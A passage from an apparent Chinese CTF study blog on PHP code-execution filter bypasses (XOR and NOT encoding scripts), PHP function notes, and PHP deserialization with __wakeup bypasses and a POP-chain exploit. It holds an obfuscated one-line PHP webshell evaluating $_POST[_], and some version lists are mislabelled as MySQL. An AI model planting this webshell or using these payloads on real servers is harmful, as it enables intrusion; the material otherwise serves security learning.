<li>python脚本<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a=[]</span><br><span class="line">ans1=<span class="string">&quot;&quot;</span></span><br><span class="line">ans2=<span class="string">&quot;&quot;</span></span><br><span class="line">myxor=<span class="string">&quot;phpinfo&quot;</span>  <span class="comment"># 想要异或编码的字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):  <span class="comment"># 全部字符的范围</span></span><br><span class="line">    c=<span class="built_in">chr</span>(i)</span><br><span class="line">    tmp = re.<span class="keyword">match</span>(<span class="string">r&#x27;[0-9]|[a-z]&#x27;</span>,c,re.I)  <span class="comment"># 设置过滤条件</span></span><br><span class="line">    <span class="keyword">if</span>(tmp):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.append(c)</span><br><span class="line">        <span class="comment"># 在数组中加入未被系统过滤掉的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">global</span> ans1  <span class="comment"># 引用全局变量ans1，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">global</span> ans2  <span class="comment"># 引用全局变量ans2，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:  <span class="comment"># 遍历未被过滤的字符</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> a:  <span class="comment"># 在上个循环的条件下遍历未被过滤的字符</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j)==<span class="built_in">ord</span>(x)):   <span class="comment"># 转化为数字进行异或比较</span></span><br><span class="line">                ans1+=i    <span class="comment"># 将每一个右边的字符储存</span></span><br><span class="line">                <span class="comment">#ans1+=&#x27;%&#x27;+hex(ord(i))[2:] 写法2</span></span><br><span class="line">                ans2+=j    <span class="comment"># 将每一个左边的字符储存</span></span><br><span class="line">                <span class="comment">#ans2+=&#x27;%&#x27;+hex(ord(j))[2:] 写法2</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> myxor:   <span class="comment"># 遍历需要编码的字符</span></span><br><span class="line">    test(m)  <span class="comment"># 使用函数的原因是为了跳出多重循环</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&#x27;&quot;</span>+urllib.request.quote(ans1)+<span class="string">&quot;&#x27;^&#x27;&quot;</span>+urllib.request.quote(ans2)+<span class="string">&quot;&#x27;)&quot;</span>)</span><br><span class="line"><span class="comment"># urllib.request.quote()将字符串转换为URL编码</span></span><br><span class="line"><span class="comment"># print(&#x27;((&#x27;+ans1+&#x27;)^(&#x27;+ans2+&#x27;))&#x27;) 写法2</span></span><br></pre></td></tr></table></figure>

已经确定了一个异或字符oxff(可修改),异或后进行URL编码,这样在引号被过滤时也可以使用<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;phpinfo&#x27;</span>  <span class="comment">#需要异或编码的函数</span></span><br><span class="line">myhex=<span class="number">0xff</span>   <span class="comment">#其中一个十六进制数</span></span><br><span class="line">hexstr=<span class="string">&#x27;%ff&#x27;</span>   <span class="comment">#url编码后的0xff</span></span><br><span class="line">encoded_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">encoded_hex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    encoded_str += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i) ^ myhex)[<span class="number">2</span>:] <span class="comment">#做了一个物理切割转化成url编码</span></span><br><span class="line">    encoded_hex +=hexstr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;((&#x27;</span>+encoded_str+<span class="string">&#x27;)^(&#x27;</span>+encoded_hex+<span class="string">&#x27;))&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>注意</strong><br>php的异或可以用<code>(&#39; &#39;^&#39; &#39;)</code>或是<code>(()^())</code>(<strong>写法2</strong>)的形式进行多个字符的异或,但是因为字符串不能直接异或,先转化为16进制,外面加个括号是为了拼接可变函数如<code>(phpinfo)()</code>才可以执行,但是别忘记最后的<code>;</code>不能少<br>如果括号,引号都被过滤了的话,也许可以考虑一下执行<code>&lt;?= include /flag ?&gt;</code>类似于这样来读取关键文件信息</li>
</ol>
<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>过滤的不多用php脚本跑一下<br>关键字符<code>~</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>).<span class="string">&#x27;)&#x27;</span>;  </span><br></pre></td></tr></table></figure>
<p>过滤了大部分字符,用汉字取反的一句话木马,密码<code>_</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=[];</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$__</span>==<span class="variable">$__</span>);</span><br><span class="line"><span class="variable">$__</span>=~(融);</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(匆);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>].<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(随);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(千);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(苦);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(~(_));</span><br><span class="line"><span class="variable">$__</span>=~(诗);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(尘);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(欣);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(站);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);<span class="comment">//assert($_POST[_])注释记得删</span></span><br></pre></td></tr></table></figure>
<h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Rce</tag>
        <tag>命令执行与代码执行</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>学习阅读代码</title>
    <url>/2023/04/12/%E5%AD%A6%E4%B9%A0%E9%98%85%E8%AF%BB%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><h2 id="error-reporting-error-level"><a href="#error-reporting-error-level" class="headerlink" title="error_reporting(error_level)"></a>error_reporting(error_level)</h2><p>设置应该报告何种 PHP 错误<br>error_level&#x3D;0 是关闭所有php错误报告</p>
<h2 id="fwrite-参1-’参2’-参3"><a href="#fwrite-参1-’参2’-参3" class="headerlink" title="fwrite(参1,’参2’,参3)"></a>fwrite(参1,’参2’,参3)</h2><p>将参数2写入参数1,最长字符数为参3</p>
<h2 id="mysql-query-sql"><a href="#mysql-query-sql" class="headerlink" title="mysql_query($sql)"></a>mysql_query($sql)</h2><ol>
<li><strong>作用</strong><br>发送一个 MySQL 查询</li>
<li><strong>注意</strong><br>此扩展在 PHP 5.5.0 中已弃用，并在 PHP 7.0.0 中被删除。<br>替代方案包括：<code>mysqli_query()</code>   <code>PDO::查询()</code><br>(i)表示改进，其执行速度更快.</li>
</ol>
<h2 id="mysqli-fetch-array"><a href="#mysqli-fetch-array" class="headerlink" title="mysqli_fetch_array()"></a>mysqli_fetch_array()</h2><p>使用或输出所有查询的数据。</p>
<h2 id="mysqli-connect"><a href="#mysqli-connect" class="headerlink" title="mysqli_connect()"></a>mysqli_connect()</h2><p>函数来连接数据库。</p>
<h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><p>判断一个变量是否为空,如果var不存在或值为空或等于零,则返回空,否则返回false。</p>
<h2 id="die-函数"><a href="#die-函数" class="headerlink" title="die()函数"></a>die()函数</h2><p>用于输出一个消息并且退出当前程序，可接受一个可选参数，用于规定在退出脚本之前写入的消息或状态号。 </p>
<h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir()"></a>mkdir()</h2><p>用于创建目录。必选参数为我们要在其中创建目录的目录路径。</p>
<h2 id="chdir-参数1"><a href="#chdir-参数1" class="headerlink" title="chdir(参数1)"></a>chdir(参数1)</h2><p>函数改变当前的目录。参数1代表新的当前目录</p>
<h2 id="stripos-参1-参2-参3"><a href="#stripos-参1-参2-参3" class="headerlink" title="stripos(参1,参2,参3)"></a>stripos(参1,参2,参3)</h2><p>参1	必需。规定被搜索的字符串。<br>参2	必需。规定要查找的字符。<br>参3	可选。规定开始搜索的位置。<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。</p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>用于将整个文件读入到一个字符串中。它接受一个文件名作为参数，并返回该文件的内容。例如：<br><code>$contents = file_get_contents(&#39;index.php&#39;);</code><br>这行代码将读取名为 <code>index.php</code> 的文件，并将其内容存储在 $contents 变量中</p>
<h2 id="file-put-contents-参1-参2"><a href="#file-put-contents-参1-参2" class="headerlink" title="file_put_contents(参1,参2)"></a>file_put_contents(参1,参2)</h2><p>它用于将字符串写入文件中。它的功能与依次调用 fopen()，fwrite() 以及 fclose()相同。<strong>将参数二的内容写入参数1的文件中</strong><br>成功返回写入到文件内数据的字节数，失败则返回 FALSE。</p>
<h2 id="array-push"><a href="#array-push" class="headerlink" title="array_push()"></a>array_push()</h2><p>array_push() 函数向数组尾部插入一个或多个元素。</p>
<h2 id="strcmp-参1-参2"><a href="#strcmp-参1-参2" class="headerlink" title="strcmp(参1,参2)"></a>strcmp(参1,参2)</h2><p><code>strcmp</code>用来比较参1,参2的大小,如果<code>参1&gt;参2</code>返回<code>1</code>,<code>参2&gt;参1</code>返回<code>-1</code>,<code>参1=参2</code>返回<code>0</code><br>需要注意的是参1和参2都必须为字符串,​php 5.2​​版本之前，利用​​strcmp​​函数将数组与字符串进行比较会返回​​-1​​，但是从​​5.3​​开始，会返回​​0​​。</p>
<h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><p><code>scandir()</code> 函数返回指定目录中的文件和目录的数组<br>成功则返回文件和目录的数组。失败则返回 FALSE。如果 directory 不是一个目录，则抛出 E_WARNING 级别的错误。<br>可以在达成代码执行时使用此函数进行,对目标文件进行获取,使用print_r()输出数组</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>学习反序列化漏洞</title>
    <url>/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>简单来说,序列化是值将数据结构或是对象转换为一种格式(每种语言不太相同),目的是为了更方便储存或是传输<br>反序列化就是序列化的逆过程,将序列化后的数据转回原始的数据结构或对象<br>暂时分为<strong>php</strong>和<strong>java</strong>两个方向来讲述反序列化漏洞(也许有一些<strong>Python</strong>),这篇主要讲述PHP的反序列化漏洞以及一些技巧</p>
<h2 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>序列化与反序列化本身并不存在问题,但是如果后端编写时导致用户能控制反序列化后的数据,用户就可以通过构造恶意序列化的数据来产生<strong>非预期对象</strong><br>php序列化函数<code>serialize()</code>，php反序列化函数<code>unserialize()</code><br>但是在php中,如果用户要利用反序列化漏洞,必须满足后端不正确的使用了魔术方法,在调用魔术方法时,产生了危害<br><strong>流程</strong>:我们可以序列化一个可以控制属性值的对象,反序列化之后这个字符串会被还原成对象,但是序列化能表示的只有属性,不包含方法,所以想要利用这个漏洞的话,我们就需要用各种手段,将需要的属性都赋上合适的值(有时候甚至是一个对象pop链,)<br>简单来说就是,我们先利用这个类创建一个可控对象,再将这个对象序列化后传入后台,如果后台这个地方会反序列化,那就成功了!</p>
<p>魔术方法简单来说,就是在类中,满足了一定条件后,会自动触发的函数,之前写的比较<a href="https://shuimao.xyz/2023/03/17/PHP%E7%9A%84%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">详细一点</a></p>
<h3 id="序列化含义"><a href="#序列化含义" class="headerlink" title="序列化含义"></a>序列化含义</h3><p>在 PHP 序列化后的字符串中，与序列化有关的字母包括：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a：表示数组。</span><br><span class="line">i：表示整数。</span><br><span class="line">b：表示布尔值。</span><br><span class="line">d：表示双精度浮点数。</span><br><span class="line">s：表示字符串。</span><br><span class="line">N：表示 NULL 值。</span><br><span class="line">O：表示对象。</span><br><span class="line">C：表示自定义对象序列化。</span><br><span class="line">r：表示引用。</span><br><span class="line">R：表示指针引用。</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>序列化一个对象</strong><br>PHP 会保存对象的所有变量，但不会保存对象的方法，只会保存类的名字。序列化后的字符串以 <code>O</code> 开头，后面跟着类名的长度、类名、对象大小和对象中每个属性的名称和值。<br><strong>private</strong> 的属性序列化后 属性名变成 <code>&lt;0x00&gt;对象&lt;0x00&gt;属性名</code><br><strong>public</strong> 属性名没有任何变化<br><strong>protected</strong> 的属性序列化后 属性名变成 <code>&lt;0x00&gt;*&lt;0x00&gt;属性名</code><br>特殊十六进制<code>&lt;0x00&gt;</code>表示一个空字节,如果要在url中使用要url编码后的<code>%00</code><br>下面是个简单的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$var1</span> = <span class="string">&#x27;value 1&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var2</span> = <span class="string">&#x27;value 2&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$var3</span> = <span class="string">&#x27;value 3&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;MyClass&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;var1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;value 1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;&lt;0x00&gt;*&lt;0x00&gt;var2&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;value 2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;&lt;0x00&gt;MyClass&lt;0x00&gt;var3&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;value 3&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>序列化一个数组</strong><br>当序列化一个数组时,会以键和键值作为对应的字符串储存<br>简单的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>] = <span class="string">&#x27;not&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;flag&quot;</span>] = <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;not&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="构造序列化后的字符串"><a href="#构造序列化后的字符串" class="headerlink" title="构造序列化后的字符串"></a>构造序列化后的字符串</h3><p>在存在反序列化漏洞时,我们需要传入序列化后的字符串,手动构造对一个类进行序列化时,有时容易出错<br>可以直接在源码后加入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Class</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
<p>创建一个对象后序列化,就可以简单的构造序列化后的字符串,需要注意的是,私有属性和受保护属性的属性名是有不可见字符<code>0x00</code>的,无法直接复制,可以用url编码<code>%00</code>代替</p>
<h3 id="wakeup-魔术方法绕过"><a href="#wakeup-魔术方法绕过" class="headerlink" title="__wakeup()魔术方法绕过"></a>__wakeup()魔术方法绕过</h3><ol>
<li><p><strong>CVE漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql版本条件</span><br><span class="line">7.0.0 - 7.0.14</span><br><span class="line">7.1.0</span><br><span class="line">5.4.14 - 5.4.45</span><br><span class="line">5.5.0 - 5.5.38</span><br><span class="line">5.6.0 - 5.6.29</span><br></pre></td></tr></table></figure>
<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行<br>原本：O:4:”Name”:<strong>2</strong>:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}   数字2代表这个对象有两个属性<br>绕过：O:4:”Name”:<strong>3</strong>:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}   数字3代表这个对象有三个属性,实际只有两个,绕过<code>__wakeup()</code></p>
</li>
<li><p><strong>使用C代替O绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql版本条件</span><br><span class="line">5.3.0 - 5.3.29</span><br><span class="line">5.4.0 - 5.4.45</span><br><span class="line">5.5.0 - 5.5.38</span><br><span class="line">5.6.0 - 5.6.40</span><br><span class="line">7.0.0 - 7.0.33</span><br><span class="line">7.1.0 - 7.1.33</span><br><span class="line">7.2.0 - 7.2.34</span><br><span class="line">7.3.0 - 7.3.28</span><br><span class="line">7.4.0 - 7.4.16</span><br><span class="line">8.0.0 - 8.0.3</span><br></pre></td></tr></table></figure>
<p>我们传入一个类似于<code>C:7:&quot;MyClass&quot;:0:&#123;&#125;</code>,没有任何属性和值,这样就可以绕过<code>__wakeup</code><br>但是使用这个方法的话,反序列化出的对象只能执行<code>construct</code>或是<code>__destruct</code>,且不能给属性赋值<br>O表示一个普通对象，而C表示一个自定义序列化的对象。如果一个类实现了Serializable接口并在类中定义了<code>serialize()</code>和<code>unserialize()</code>方法，那么这时<code>serialize()</code>这个类的对象时，会生成一个以 C 开头的序列化字符串</p>
</li>
<li><p><strong>利用反序列化字符串报错fast-destruct</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql版本条件</span><br><span class="line">5.3.0 - 5.3.29</span><br><span class="line">5.4.0 - 5.4.45</span><br><span class="line">5.5.0 - 5.5.38</span><br><span class="line">5.6.0 - 5.6.40</span><br><span class="line">7.0.0 - 7.0.33</span><br><span class="line">7.1.0 - 7.1.33</span><br><span class="line">7.2.0 - 7.2.34</span><br><span class="line">7.3.0 - 7.3.28</span><br><span class="line">7.4.0 - 7.4.16</span><br><span class="line">8.0.0 - 8.0.3</span><br></pre></td></tr></table></figure>
<p>在序列化字符串最后面加上一个<code>N;</code>，从而触发错误并优先执行<code>__destruct</code>，从而实现对<code>__wakeup</code>的绕过。<br>这种方法的原理是，在反序列化过程中，如果遇到错误，PHP会抛出一个异常。如果在类中定义了__destruct方法，那么在抛出异常之前，PHP会先调用这个方法来清理资源。因此，如果在序列化字符串最后面加上一个<code>N;</code>，就会触发一个错误，并且在抛出异常之前，PHP会先调用<code>__destruct</code>方法。<br>这种方法适用于类中定义了__destruct方法，并且在这个方法中可以执行一些有用的操作的情况。但是它依赖于特定的类结构和代码逻辑，因此并不是所有情况下都能成功。<br>例如  O:4:”Test”:1:{s:4:”data”;s:11:”Hello World”;<strong>N;</strong>}</p>
</li>
</ol>
<h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><ol>
<li><strong>切入点</strong><br> 当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使$a永远与$b相等<br> 简单来说,这个方式就是将一个属性的值赋值为另一个属性的地址<br> 例如 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Test</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$Test</span>-&gt;a=&amp;Test-&gt;b;   <span class="comment">//将a的值赋值为b的地址,可以实现一些绕过</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(@<span class="title function_ invoke__">serialize</span>(<span class="variable">$Test</span>));</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><ol>
<li><strong>什么是pop链</strong><br>POP链（Property Oriented Programming Chain）是一种利用PHP魔术方法进行多次跳转，最终到达关键函数,获取敏感数据。它通常与反序列化漏洞一起出现，可以理解为是反序列化漏洞利用的一种拓展，泛用性更强，涉及到的魔法方法也更多</li>
<li><strong>怎么切入</strong><br>如果一个题目里出现了很多的类和魔术方法,并且出现了反序列化函数,这题很有可能是考察pop的思考,<br>如果遇到这种情况,首先应该确定出发点(一般来说是可以自动触发的魔术方法)和终点(危险函数所在的魔术方法),在用逆推和正推相结合写出一条完整的链子</li>
<li><strong>链子怎么写</strong><br>如果是逆推的话,先看这个方法要怎么到达,再看下面有没有符合条件的情况,比如危险函数在魔术方法<code>__invoke</code>中,试着去寻找有没有在方法中把属性当做函数使用的,如果有,那么把属性对象化,那不就是把对象当做函数使用,这时就会跳转到<code>__invoke</code>中了  </li>
<li><strong>例子</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
链子写法不一定相同,写出两种比较常见的写法<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="comment">//实例化一个show,会触发__construct(起点)</span></span><br><span class="line"><span class="variable">$pop</span>-&gt;source=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="comment">//把第一个show的source属性实例化成show对象,这时候属性是一个对象,如果把这个show对象当做字符串,会触发show类中的__toString</span></span><br><span class="line"><span class="variable">$pop</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//把第二个show中的str属性实例化成Test对象,这时候toSting中调用了str-&gt;source,因为在Test对象中调用了不存在的属性,会触发Test类中的__get</span></span><br><span class="line"><span class="variable">$pop</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="comment">//把第三个Test类中的p属性实例化成Modifier对象,这时候__get中把属性p当做函数使用,属性p是Modifier对象,这时候会触发Modifier类中的__invoke(终点危险函数include)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));  <span 